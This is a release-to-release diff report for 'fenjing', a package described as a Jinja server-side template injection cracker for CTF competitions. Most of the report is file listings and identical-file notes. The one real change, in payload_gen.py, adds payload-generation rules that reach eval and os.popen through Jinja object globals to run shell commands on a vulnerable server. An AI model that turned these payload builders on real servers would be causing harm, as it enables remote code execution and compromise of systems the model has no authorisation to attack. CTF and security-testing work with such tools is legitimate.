# Comparing `tmp/fenjing-0.4.5.tar.gz` & `tmp/fenjing-0.4.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.4.5.tar", last modified: Sat Jul  8 15:33:37 2023, max compression
+gzip compressed data, was "fenjing-0.4.6.tar", last modified: Wed Jul 12 09:49:22 2023, max compression
```

## Comparing `fenjing-0.4.5.tar` & `fenjing-0.4.6.tar`

### file list

```diff
@@ -1,37 +1,37 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-08 15:33:27.000000 fenjing-0.4.5/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-08 15:33:27.000000 fenjing-0.4.5/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     7172 2023-07-08 15:33:37.901622 fenjing-0.4.5/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     6735 2023-07-08 15:33:27.000000 fenjing-0.4.5/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-08 15:33:27.000000 fenjing-0.4.5/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     9136 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1834 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)     6814 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7473 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    32102 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     2060 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/shell_payload.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     4866 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     9354 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     7172 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 15:33:27.000000 fenjing-0.4.5/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-08 15:33:37.901622 fenjing-0.4.5/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-08 15:33:27.000000 fenjing-0.4.5/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-08 15:33:27.000000 fenjing-0.4.5/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-08 15:33:27.000000 fenjing-0.4.5/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:49:22.213267 fenjing-0.4.6/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-12 09:49:12.000000 fenjing-0.4.6/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-12 09:49:12.000000 fenjing-0.4.6/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     7172 2023-07-12 09:49:22.213267 fenjing-0.4.6/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     6735 2023-07-12 09:49:12.000000 fenjing-0.4.6/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-12 09:49:12.000000 fenjing-0.4.6/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:49:22.209267 fenjing-0.4.6/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9136 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1834 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6814 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7473 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    32506 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2060 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/shell_payload.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:49:22.213267 fenjing-0.4.6/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     4866 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9354 2023-07-12 09:49:13.000000 fenjing-0.4.6/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:49:22.213267 fenjing-0.4.6/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     7172 2023-07-12 09:49:22.000000 fenjing-0.4.6/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-12 09:49:22.000000 fenjing-0.4.6/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-12 09:49:22.000000 fenjing-0.4.6/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-12 09:49:22.000000 fenjing-0.4.6/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-12 09:49:22.000000 fenjing-0.4.6/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-12 09:49:13.000000 fenjing-0.4.6/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-12 09:49:22.213267 fenjing-0.4.6/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-12 09:49:13.000000 fenjing-0.4.6/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:49:22.213267 fenjing-0.4.6/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-12 09:49:13.000000 fenjing-0.4.6/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-12 09:49:13.000000 fenjing-0.4.6/tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.5/LICENSE` & `fenjing-0.4.6/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/PKG-INFO` & `fenjing-0.4.6/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.5
+Version: 0.4.6
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.4.5/README.md` & `fenjing-0.4.6/README.md`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/cli.py` & `fenjing-0.4.6/fenjing/cli.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/colorize.py` & `fenjing-0.4.6/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/config_payload.py` & `fenjing-0.4.6/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/const.py` & `fenjing-0.4.6/fenjing/const.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/context_vars.py` & `fenjing-0.4.6/fenjing/context_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/form.py` & `fenjing-0.4.6/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/form_cracker.py` & `fenjing-0.4.6/fenjing/form_cracker.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/full_payload_gen.py` & `fenjing-0.4.6/fenjing/full_payload_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/payload_gen.py` & `fenjing-0.4.6/fenjing/payload_gen.py`

 * *Files 1% similar despite different names*

```diff
@@ -118,14 +118,16 @@
             return None
 
         gens = req_gens[gen_type].copy()
         gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
             ret = self.generate_by_list(gen(self.context, *args))
             if ret is None:
+                if hashable(gen_req):
+                    self.cache[gen_req] = ret
                 continue
             result = ret[0]
             self.callback(
                 CALLBACK_GENERATE_PAYLOAD,
                 {"gen_type": gen_type, "args": args, "payload": result},
             )
             # 为了日志的简洁，仅打印一部分日志
@@ -1167,24 +1169,24 @@
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
             (ITEM, "eval"),
         )
     ]
 
 
-# @req_gen
-# def gen_eval_func_x(context):
-#     return [(
-#         CHAINED_ATTRIBUTE_ITEM,
-#         (LITERAL, "x"),
-#         (ATTRIBUTE, "__init__"),
-#         (ATTRIBUTE, "__globals__"),
-#         (ITEM, "__builtins__"),
-#         (ITEM, "eval")
-#     )]
+@req_gen
+def gen_eval_func_namespace(context):
+    return [(
+        CHAINED_ATTRIBUTE_ITEM,
+        (LITERAL, "namespace"),
+        (ATTRIBUTE, "__init__"),
+        (ATTRIBUTE, "__globals__"),
+        (ITEM, "__builtins__"),
+        (ITEM, "eval")
+    )]
 
 # ---
 
 
 @req_gen
 def gen_eval_normal(context, code):
     return [
@@ -1259,45 +1261,62 @@
             (CLASS_ATTRIBUTE, "__init__"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "os"),
         )
     ]
 
 
-# ---
+@req_gen
+def gen_module_os_eval(context):
+    return [
+        (EVAL, "__import__"),
+        (LITERAL, "("),
+        (STRING, "os"),
+        (LITERAL, ")"),
+    ]
 
+# ---
 
-@req_gen
-def gen_os_popen_obj_eval(context, cmd):
-    cmd = cmd.replace("'", "\\'")
-    return [(EVAL, "__import__('os').popen('" + cmd + "')")]
 
 
 @req_gen
 def gen_os_popen_obj_normal(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (MODULE_OS,), "popen"),
         (LITERAL, "("),
         (STRING, cmd),
         (LITERAL, "))"),
     ]
 
 
+
+@req_gen
+def gen_os_popen_obj_eval(context, cmd):
+    cmd = cmd.replace("'", "\\'")
+    return [(EVAL, "__import__('os').popen('" + cmd + "')")]
+
+
 # ---
 
 
 @req_gen
 def gen_os_popen_read_normal(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "())"),
     ]
 
+@req_gen
+def gen_os_popen_read_eval(context, cmd):
+    return [
+        (EVAL, "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'"))),
+    ]
+
 
 if __name__ == "__main__":
     import time
     import functools
 
     @functools.lru_cache(100)
     def waf_func(payload: str):
```

### Comparing `fenjing-0.4.5/fenjing/requester.py` & `fenjing-0.4.6/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/scan_url.py` & `fenjing-0.4.6/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/shell_payload.py` & `fenjing-0.4.6/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/templates/index.html` & `fenjing-0.4.6/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/waf_func_gen.py` & `fenjing-0.4.6/fenjing/waf_func_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing/webui.py` & `fenjing-0.4.6/fenjing/webui.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/fenjing.egg-info/PKG-INFO` & `fenjing-0.4.6/fenjing.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.5
+Version: 0.4.6
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.4.5/fenjing.egg-info/SOURCES.txt` & `fenjing-0.4.6/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/setup.py` & `fenjing-0.4.6/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/tests/test_full_payload_gen.py` & `fenjing-0.4.6/tests/test_full_payload_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.5/tests/test_payload_gen.py` & `fenjing-0.4.6/tests/test_payload_gen.py`

 * *Files identical despite different names*

